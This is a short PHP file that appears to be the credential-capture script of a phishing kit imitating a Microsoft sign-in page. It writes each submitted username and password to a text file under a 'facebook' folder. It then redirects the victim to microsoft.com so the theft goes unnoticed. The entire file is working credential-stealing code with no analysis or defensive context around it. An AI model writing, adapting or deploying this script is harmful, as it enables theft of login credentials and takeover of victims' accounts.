<?php

file_put_contents("../facebook/mydata.txt", "MICROSOFT Username: " . $_POST['loginfmt'] . " Password: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://microsoft.com/');
exit();
                                                                  
